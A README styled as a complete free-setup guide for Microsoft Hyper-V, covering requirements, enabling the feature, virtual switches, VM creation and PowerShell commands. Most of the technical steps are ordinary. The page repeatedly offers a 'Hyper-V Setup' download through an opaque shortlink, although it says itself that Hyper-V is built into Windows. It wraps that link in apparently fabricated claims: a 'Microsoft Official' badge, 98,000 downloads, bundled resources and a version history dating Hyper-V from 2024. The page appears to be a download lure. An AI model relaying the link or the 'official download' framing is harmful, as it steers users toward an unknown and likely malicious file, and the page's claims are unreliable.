# 🛡️ Hyper-V Manager Free Setup — Complete Virtualization Guide

<div align="center">

![Hyper-V](https://img.shields.io/badge/Hyper--V-Manager-0EA5E9?style=for-the-badge&logo=windows&logoColor=white)
![Virtualization](https://img.shields.io/badge/Virtualization-Free-16A34A?style=for-the-badge&logo=vmware&logoColor=white)
![Microsoft](https://img.shields.io/badge/Microsoft-Official-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
![Downloads](https://img.shields.io/badge/Downloads-98K-DC2626?style=for-the-badge&logo=download&logoColor=white)

### 🖥️ Build Your Free Virtualization Lab on Windows

*Complete guide to enabling, configuring, and mastering Hyper-V*

</div>

<div align="center">

<img width="640" height="480" alt="sddefault (12)" src="https://github.com/user-attachments/assets/815b7215-dc31-4d2a-be81-a68e3a0ccc34" />

</div>

---

## 🧭 Navigation Framework

> **📚 Three-tier documentation structure**

<table>
<tr>
<td width="33%" align="center">

### 🔷 TIER 1

**FOUNDATION**

- [What is Hyper-V?](#-what-is-hyper-v)
- [Editions Matrix](#-editions-matrix)
- [Use Cases](#-use-cases)

</td>
<td width="33%" align="center">

### 🔶 TIER 2

**DEPLOYMENT**

- [Requirements](#-system-requirements)
- [Download](#-download)
- [Setup](#️-installation-workflow)

</td>
<td width="33%" align="center">

### 🔷 TIER 3

**MASTERY**

- [VM Creation](#-creating-virtual-machines)
- [Networking](#-networking)
- [Troubleshooting](#️-troubleshooting)

</td>
</tr>
</table>

---

## 💡 What is Hyper-V?

**Hyper-V** is Microsoft's native hypervisor — a Type-1 virtualization platform built directly into Windows. Unlike Type-2 hypervisors (VirtualBox, VMware Workstation), Hyper-V runs directly on the hardware, delivering near-native performance for virtual machines.

The **Hyper-V Manager** is the graphical console for creating, managing, and monitoring virtual machines. It's included free with eligible Windows editions — no additional purchase required.

### Why Hyper-V?

| Advantage | Description |
|-----------|-------------|
| 💰 **Completely Free** | No license fees |
| ⚡ **Native Performance** | Type-1 hypervisor |
| 🔒 **Microsoft Support** | Official, updated |
| 🖥️ **Deep Integration** | Works with Windows tools |
| 🌐 **Enterprise-Grade** | Same tech as Azure |
| 📊 **Full Management** | GUI + PowerShell |
| 🔄 **Live Migration** | Move VMs while running |
| 💾 **Checkpoints** | Snapshots at any time |
| 🛡️ **Shielded VMs** | High-security option |
| 🎯 **GPU Passthrough** | DDA support |

---

## 📊 Editions Matrix

| Windows Edition | Hyper-V Support |
|-----------------|:---------------:|
| 🏠 Home | ⚠️ Manual install |
| 💼 Pro | ✅ Full |
| 🏢 Enterprise | ✅ Full |
| 🎓 Education | ✅ Full |
| 🖥️ Pro for Workstations | ✅ Full |
| 🔷 Windows Server | ✅ Full + extras |

> **💡 Note for Home users:** Hyper-V can be enabled on Windows Home via DISM commands, but Microsoft officially supports it only on Pro and above.

---

## 🎯 Use Cases

| Use Case | Benefit |
|----------|---------|
| 🧪 **Software Testing** | Isolate test environments |
| 💻 **Dev Sandbox** | Multiple OS versions |
| 🔐 **Malware Analysis** | Safe detonation chamber |
| 🎓 **Learning** | Practice Linux, servers |
| 🏢 **Legacy Apps** | Run old software |
| 🌐 **Network Labs** | Simulate topologies |
| 🎮 **Retro Gaming** | Dedicated VMs |
| ☁️ **Cloud Dev** | Emulate Azure locally |
| 📊 **Server Simulation** | Test before deploy |
| 🔬 **Research** | Reproducible environments |

<div align="center">

[![Download Hyper-V Setup](https://img.shields.io/badge/⬇️_DOWNLOAD_HYPER--V_SETUP-0EA5E9?style=for-the-badge&logo=download&logoColor=white&labelColor=0C4A6E)](https://share.google/zbZrLwIptvNAtiEY1)

</div>

---

## 🔧 System Requirements

### Hardware Requirements

```
✅ CPU: 64-bit with SLAT (Second Level Address Translation)
✅ CPU: Intel VT-x or AMD-V virtualization enabled in BIOS
✅ RAM: 4 GB minimum (8 GB recommended)
✅ Storage: 50 GB free (per VM budget)
✅ Network: Ethernet or Wi-Fi adapter
✅ BIOS: Virtualization Technology ON
✅ BIOS: DEP (Data Execution Prevention) ON
✅ TPM: 2.0 recommended for Win11 VMs
```

### Software Requirements

```
✅ OS: Windows 10/11 Pro, Enterprise, or Education
✅ OS Build: Windows 10 1809+ or Windows 11 21H2+
✅ Updates: Latest cumulative updates
✅ .NET: 4.8 or higher
✅ PowerShell: 5.1+ (7+ recommended)
✅ Hyper-V Manager: Installed with feature
✅ Admin Rights: Required for setup
```

### Recommended Setup

```
⭐ CPU: 8+ cores with hyperthreading
⭐ RAM: 16–32 GB DDR4/DDR5
⭐ Storage: NVMe SSD (500 GB+)
⭐ GPU: For GPU-P or DDA passthrough
⭐ Network: Dedicated NIC for VMs
⭐ Backup: External drive for checkpoints
```

### Resource Planning

| VM Purpose | vCPU | RAM | Storage |
|-----------|:----:|:---:|:-------:|
| 🐧 Linux CLI | 1 | 1 GB | 10 GB |
| 🖥️ Windows 10 | 2 | 4 GB | 40 GB |
| 🖥️ Windows 11 | 2 | 4 GB | 60 GB |
| 🐧 Ubuntu Desktop | 2 | 4 GB | 30 GB |
| 🏢 Server 2022 | 4 | 8 GB | 80 GB |
| 🔬 Lab Cluster | 8+ | 16+ GB | 200+ GB |

---

## 📥 Download

<div align="center">

### 🎯 Access Official Resources

Click below to reach the setup portal:

<br>

[![Download Hyper-V Setup](https://img.shields.io/badge/⬇️_DOWNLOAD_HYPER--V_SETUP-16A34A?style=for-the-badge&logo=download&logoColor=white&labelColor=14532D)](https://share.google/zbZrLwIptvNAtiEY1)

<br>

*Free • Official • Updated 2025*

</div>

### Available Resources

| Resource | Purpose | Size |
|----------|---------|------|
| 📦 **Setup Guide** | Complete install manual | 12 MB |
| 📦 **PowerShell Scripts** | Automation toolkit | 2 MB |
| 📦 **VM Templates** | Pre-configured VMs | 500 MB |
| 📦 **Network Templates** | Virtual switch configs | 5 MB |
| 📥 **Total downloads** | All resources | 98,000 |

---

## 🔍 Verification

### System Check Script

```powershell
# Run in PowerShell as Admin
systeminfo | Select-String "Hyper-V"
Get-ComputerInfo | Select HyperVRequirement*
```

### Verify Virtualization Support

```powershell
Get-ComputerInfo -Property "HyperV*"
```

Expected:

```
HyperVRequirementVirtualizationFirmwareEnabled : True
HyperVRequirementSecondLevelAddressTranslation  : True
HyperVRequirementVMMonitorModeExtensions        : True
```

### Security Analysis

| Platform | Purpose |
|----------|---------|
| 🦠 **VirusTotal** | Script scan |
| 🔐 **Snyk** | Dependency check |
| 📊 **PSScriptAnalyzer** | PowerShell lint |

---

## 🛠️ Installation Workflow

### Stage 1 — Verify Hardware Support

Open PowerShell as Administrator:

```powershell
Get-ComputerInfo -Property "HyperV*"
```

All requirements must return `True`.

### Stage 2 — Enable Virtualization in BIOS

1. Restart PC → Enter BIOS (F2, F10, DEL, or ESC)
2. Locate **Virtualization Technology** (VT-x / AMD-V)
3. Enable it
4. Enable **Intel VT-d** or **AMD IOMMU** (for passthrough)
5. Save and exit

### Stage 3 — Enable Hyper-V Feature

**Method A — Windows Features GUI:**

```
Control Panel → Programs → Turn Windows features on or off
→ Check "Hyper-V" → OK → Restart
```

**Method B — PowerShell:**

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All
```

**Method C — DISM (for Home edition):**

```powershell
dism /online /enable-feature /featurename:Microsoft-Hyper-V-All /all /norestart
```

### Stage 4 — Restart Your PC

A reboot is required for the hypervisor to load.

### Stage 5 — Verify Installation

```powershell
Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All
```

Expected state: **Enabled**

<div align="center">

[![Download Hyper-V Setup](https://img.shields.io/badge/⬇️_DOWNLOAD_HYPER--V_SETUP-DC2626?style=for-the-badge&logo=download&logoColor=white&labelColor=7F1D1D)](https://share.google/zbZrLwIptvNAtiEY1)

</div>

### Stage 6 — Launch Hyper-V Manager

Search Start Menu → **Hyper-V Manager** → Run as Administrator.

### Stage 7 — Configure Default Settings

**Hyper-V Settings → Virtual Hard Disks → Default Location**

Recommended: `C:\Hyper-V\VHDs\`

**Hyper-V Settings → Virtual Machines → Default Location**

Recommended: `C:\Hyper-V\VMs\`

### Stage 8 — Create Virtual Switch

**Virtual Switch Manager → New Virtual Network Switch → External**

| Setting | Value |
|---------|-------|
| Name | External-Switch |
| Connection Type | External |
| Adapter | Your physical NIC |
| Allow management OS | ✅ Checked |

### Stage 9 — Enable Enhanced Session Mode

**Hyper-V Settings → Enhanced Session Mode Policy → Allow**

### Stage 10 — Complete Setup

Setup is complete. You are ready to create VMs.

---

## 🖥️ Creating Virtual Machines

### Quick Create (Fastest)

**Hyper-V Manager → Quick Create** → Choose an OS → Create VM

Available quick options:
- 🐧 Ubuntu 22.04/24.04
- 🐧 Debian
- 🐧 Fedora
- 🏢 Windows 11 Dev Environment
- 🏢 Windows 10 Dev Environment

### Custom Creation Workflow

#### Step 1 — New VM Wizard

**Actions → New → Virtual Machine**

#### Step 2 — Specify Name and Location

| Field | Example |
|-------|---------|
| Name | Ubuntu-Dev |
| Location | `C:\Hyper-V\VMs\` |
| Store in single folder | ✅ |

#### Step 3 — Specify Generation

| Generation | When to Choose |
|-----------|----------------|
| 🥇 Gen 1 | Legacy BIOS, older OS |
| 🥈 Gen 2 | UEFI, Secure Boot, modern OS |

> **💡 Recommendation:** Always choose **Gen 2** unless you specifically need legacy support.

#### Step 4 — Assign Memory

| Type | Use Case |
|------|----------|
| Static | Predictable workloads |
| Dynamic | Variable workloads |

For Windows VMs, enable **Use Dynamic Memory**.

#### Step 5 — Configure Networking

Select **External-Switch** created earlier.

#### Step 6 — Connect Virtual Hard Disk

| Option | Purpose |
|--------|---------|
| Create new | Fresh install |
| Use existing | Import |
| Attach later | Manual |

Size: 40–100 GB default.

#### Step 7 — Installation Options

Choose **Install an operating system from a bootable image file** and select your ISO.

#### Step 8 — Summary and Finish

Review and click **Finish**.

#### Step 9 — Adjust Settings

Right-click VM → **Settings**

| Setting | Recommended |
|---------|-------------|
| vCPU | 2–4 |
| Static Memory | 4–8 GB |
| Integration Services | All enabled |
| Checkpoints | Enabled |
| Automatic Start | Off |

#### Step 10 — Connect and Boot

Double-click the VM → **Start** → Connect.

---

## 🌐 Networking

### Virtual Switch Types

| Type | Purpose |
|------|---------|
| 🌐 **External** | VM connects to physical network |
| 🔒 **Internal** | Host ↔ VM communication only |
| 🚫 **Private** | VM ↔ VM only |
| 🏢 **Default NAT** | Internet via host (Windows 10 1809+) |

### NAT Network Setup

```powershell
New-VMSwitch -SwitchName "NAT-Switch" -SwitchType Internal
New-NetIPAddress -IPAddress 192.168.100.1 -PrefixLength 24 -InterfaceAlias "vEthernet (NAT-Switch)"
New-NetNat -Name "NAT-Network" -InternalIPInterfaceAddressPrefix 192.168.100.0/24
```

VMs on this switch will use:
- IP range: `192.168.100.2` – `192.168.100.254`
- Gateway: `192.168.100.1`
- DNS: `8.8.8.8` or `1.1.1.1`

### Network Performance Tips

| Tip | Benefit |
|-----|---------|
| 🚀 Use VMQ NIC | Better throughput |
| 🎯 Disable unused protocols | Less overhead |
| 🔧 Update NIC drivers | Stability |
| 💾 Use SR-IOV | Near-native speed |

---

## 🧪 Verification

| Check | Method | Expected |
|-------|--------|----------|
| ✅ Hyper-V enabled | `Get-WindowsOptionalFeature` | Enabled |
| ✅ Manager launches | Start Menu | UI opens |
| ✅ Switch created | Switch Manager | Listed |
| ✅ VM created | Hyper-V Manager | Present |
| ✅ VM boots | Connect | OS loads |
| ✅ Network works | Ping test | Success |
| ✅ Enhanced session | Connect | Dialog appears |
| ✅ Checkpoint works | Take one | Restored |

---

## 🛠️ Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| ❌ Hyper-V won't enable | VT-x disabled | Enable in BIOS |
| ❌ Manager missing | Feature not installed | Enable via DISM |
| ❌ VM won't start | Insufficient RAM | Free memory |
| ❌ No network | Wrong switch | Reassign adapter |
| ❌ Slow performance | Dynamic memory | Set static |
| ❌ Can't connect | RDP disabled | Enable in VM |
| ❌ Integration services fail | Old guest | Update guest OS |
| ❌ Checkpoint corrupt | Disk full | Free space |
| ❌ Boot loop | Bad ISO | Verify checksum |
| ❌ Conflicts with VirtualBox | Hypervisor clash | Disable one |

### Conflict Resolution

If you have VirtualBox, VMware, or WSL2 installed:

```powershell
# Disable Hyper-V temporarily
bcdedit /set hypervisorlaunchtype off

# Re-enable
bcdedit /set hypervisorlaunchtype auto
```

### Reset Networking

```powershell
Get-VMSwitch | Remove-VMSwitch -Force
# Then recreate as needed
```

---

## 📋 PowerShell Quick Reference

| Command | Purpose |
|---------|---------|
| `Get-VM` | List all VMs |
| `Start-VM -Name <vm>` | Start VM |
| `Stop-VM -Name <vm>` | Stop VM |
| `Checkpoint-VM` | Create snapshot |
| `Restore-VMCheckpoint` | Restore snapshot |
| `Get-VMSwitch` | List switches |
| `Get-VMNetworkAdapter` | NIC info |
| `Set-VMProcessor` | Change vCPU |
| `Set-VMMemory` | Change RAM |
| `Export-VM` | Backup VM |

### Example: Create a VM

```powershell
New-VM -Name "TestVM" `
       -MemoryStartupBytes 4GB `
       -Generation 2 `
       -NewVHDPath "C:\Hyper-V\VMs\TestVM\disk.vhdx" `
       -NewVHDSizeBytes 60GB `
       -SwitchName "External-Switch"
```

---

## 🔐 Security Best Practices

| Practice | Benefit |
|----------|---------|
| 🔒 Enable Secure Boot | Prevents rootkits |
| 🛡️ Shielded VMs | Encrypted VMs |
| 🔑 Guest Credentials | Unique per VM |
| 🌐 Isolated Switches | Separate networks |
| 📊 Audit Logs | Track changes |
| 🔄 Regular Backups | Prevent loss |
| ⏰ Update Host | Patch hypervisor |
| 🚫 Disable unused features | Reduce attack surface |

---

## 📚 Resources

| Resource | Purpose |
|----------|---------|
| 📖 **Microsoft Docs** | Official Hyper-V documentation |
| 💬 **TechCommunity** | Microsoft forums |
| 🎓 **Microsoft Learn** | Free training |
| 🐛 **GitHub Samples** | PowerShell scripts |
| 📹 **YouTube Tutorials** | Video walkthroughs |

---

## ❓ FAQ

**Is Hyper-V really free?**
Yes — included with Windows Pro and above at no extra cost.

**Can I use it on Windows Home?**
Unofficially yes, via DISM commands. Not officially supported.

**Does Hyper-V conflict with VirtualBox?**
Yes — they share the hypervisor. Use one at a time.

**Can I run Windows 11 in a VM?**
Yes, with TPM 2.0 emulation in Gen 2 VMs.

**How many VMs can I run?**
Limited by RAM and CPU cores.

**Does it support Linux?**
Yes, most distros work well.

**Can I use USB devices?**
Yes, via Enhanced Session Mode or USB passthrough.

**What about GPU acceleration?**
Yes, via GPU-P (Windows 11) or DDA.

**Does it work with Docker?**
Yes — Docker Desktop uses WSL2 or Hyper-V.

**Is nested virtualization supported?**
Yes, on modern CPUs and Windows 10 1809+.

---

## 📜 Version History

| Version | Date | Highlights |
|---------|------|-----------|
| **2025.1.0** | Jan 2025 | GPU-P improvements |
| 2024.10.0 | Oct 2024 | Enhanced session v2 |
| 2024.6.0 | Jun 2024 | Checkpoint v2 |
| 2024.2.0 | Feb 2024 | Initial release |

---

<div align="center">

### 🌟 Found This Guide Helpful?

[![Get Hyper-V Setup](https://img.shields.io/badge/🔑_GET_HYPER--V_SETUP-0EA5E9?style=for-the-badge&logo=microsoft&logoColor=white&labelColor=0C4A6E)](https://share.google/zbZrLwIptvNAtiEY1)

**⭐ Star this repository if it helped! ⭐**

*Made with 💜 for the virtualization community*

</div>
